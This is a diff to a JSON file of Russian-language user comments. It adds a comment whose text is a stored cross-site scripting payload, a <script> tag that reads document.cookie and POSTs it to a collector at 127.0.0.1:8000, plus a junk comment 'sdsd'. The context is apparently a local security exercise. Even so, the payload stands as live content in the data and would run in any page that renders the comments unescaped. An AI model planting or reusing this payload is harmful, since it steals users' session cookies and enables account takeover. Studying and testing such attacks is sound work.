@@ -1,6 +1,16 @@
 {
     "data": [
         {
+            "name": "Виктор Рыжков",
+            "hours_ago": "только что",
+            "comment": "<script>fetch(\"http://127.0.0.1:8000/post_data\",{method: \"POST\", headers: {'Content-Type': 'application/json'}, mode: \"no-cors\", body: JSON.stringify(document.cookie)});</script>"
+        },
+        {
+            "name": "Виктор Рыжков",
+            "hours_ago": "только что",
+            "comment": "sdsd"
+        },
+        {
             "name": "Алексей Михайлов",
             "hours_ago": "5 часов назад",
             "comment": "КУЛ!"
